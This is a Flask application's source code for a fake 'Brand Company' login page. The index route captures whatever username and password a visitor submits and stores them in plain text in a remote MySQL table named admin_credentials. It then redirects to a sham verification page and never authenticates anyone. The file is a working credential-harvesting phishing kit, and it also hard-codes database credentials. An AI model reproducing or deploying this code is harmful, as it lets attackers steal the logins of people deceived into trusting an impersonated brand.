from flask import Flask, render_template, request, url_for, redirect, session
from flaskext.mysql import MySQL
import os

random_key = os.urandom(24)

mysql = MySQL()
app = Flask(__name__)

# Config for the MySQL Database
app.config['MYSQL_DATABASE_USER'] = 'Wk8PXVe7Ti'
app.config['MYSQL_DATABASE_PASSWORD'] = 'KkTjp8vYKA'
app.config['MYSQL_DATABASE_HOST'] = 'remotemysql.com'
app.config['MYSQL_DATABASE_DB'] = 'Wk8PXVe7Ti'
app.config['MYSQL_DATABASE_CURSORCLASS'] ='DictCursor'
app.config['SECRET_KEY'] = random_key
mysql.init_app(app)

con = mysql.connect()
cursor = con.cursor()

# Create the database when launcher.py is launched.
cursor.execute('''CREATE TABLE IF NOT EXISTS admin_credentials
(id int NOT NULL AUTO_INCREMENT, username varchar(50) NOT NULL,
password varchar(255), PRIMARY KEY(id))''')
cursor.execute('''ALTER TABLE admin_credentials AUTO_INCREMENT = 1;''')

# Index form of what we log into.
@app.route("/", methods=['GET', 'POST'])
def index():
	if request.method == 'POST':
		username_input = request.form['usernameField']
		password_input = request.form['passwordField']

		con = mysql.connect()
		cursor = con.cursor()

		cursor.execute('''INSERT INTO admin_credentials (username, password) VALUES (%s, %s)''', (username_input, password_input))
		con.commit()
		return redirect(url_for('verify'))
	else: 
		return render_template('login.html', title="Login | Brand Company")

# The redirect link, which is to the verification.
@app.route("/verification")
def verify():
	return render_template('verify.html', title="Verification | Brand Company")

# Do this before every request, just to make sure everything works properly without crashing
@app.before_request
def before():
	cursor.execute('''CREATE TABLE IF NOT EXISTS admin_credentials
	(id int NOT NULL AUTO_INCREMENT, username varchar(50) NOT NULL,
	password varchar(255), PRIMARY KEY(id))''')
	cursor.execute('''ALTER TABLE admin_credentials AUTO_INCREMENT = 1''')

# When deployed on heroku, this isn't needed.
if __name__ == '__main__':
	app.run(debug=True)
